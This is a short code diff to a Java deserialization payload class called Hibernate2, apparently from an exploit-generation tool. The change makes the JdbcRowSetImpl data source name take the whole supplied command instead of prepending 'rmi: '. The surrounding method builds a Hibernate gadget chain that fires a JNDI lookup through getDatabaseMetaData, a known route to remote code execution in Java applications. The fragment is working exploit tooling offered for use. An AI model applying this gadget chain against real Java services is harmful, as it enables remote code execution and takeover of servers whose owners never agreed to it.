@@ -49,7 +49,7 @@ public class Hibernate2 implements ObjectPayload<Object>, DynamicDependencies {
    
     public Object getObject ( String command ) throws Exception {
         JdbcRowSetImpl rs = new JdbcRowSetImpl();
-        rs.setDataSourceName("rmi: " + command);
+        rs.setDataSourceName(command);
         return Hibernate1.makeCaller(rs,Hibernate1.makeGetter(rs.getClass(), "getDatabaseMetaData") );
     }
 
